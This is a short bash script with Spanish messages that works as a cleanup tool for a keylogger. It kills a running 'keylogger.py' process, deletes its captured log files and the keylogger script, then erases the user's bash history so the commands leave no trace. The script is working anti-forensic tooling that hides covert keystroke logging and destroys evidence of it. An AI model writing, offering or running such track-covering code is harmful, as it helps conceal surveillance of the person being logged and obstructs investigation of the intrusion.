#!/usr/bin/env bash
set -u

SCRIPT_NAME="keylogger.py"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TARGET_SCRIPT="$SCRIPT_DIR/$SCRIPT_NAME"

echo "Buscando proceso $SCRIPT_NAME..."

if pgrep -f "$SCRIPT_NAME" > /dev/null; then
    pkill -f "$SCRIPT_NAME"
    echo "Proceso $SCRIPT_NAME detenido."
else
    echo "No se encontró $SCRIPT_NAME ejecutándose."
fi

echo "Eliminando archivos de registro..."

LOG_FILES=(
    "output.txt"
    "$HOME/output.txt"
)

for file in "${LOG_FILES[@]}"; do
    if [ -f "$file" ]; then
        rm -f "$file"
        echo "Eliminado: $file"
    else
        echo "No existe: $file"
    fi
done

echo "Eliminando archivo $SCRIPT_NAME..."

if [ -f "$TARGET_SCRIPT" ]; then
    rm -f "$TARGET_SCRIPT"
    echo "Archivo eliminado: $TARGET_SCRIPT"
else
    echo "No se encontró: $TARGET_SCRIPT"
fi

# Limpiar el historial de comandos
cat /dev/null > ~/.bash_history
history -c 

echo "Limpieza completada."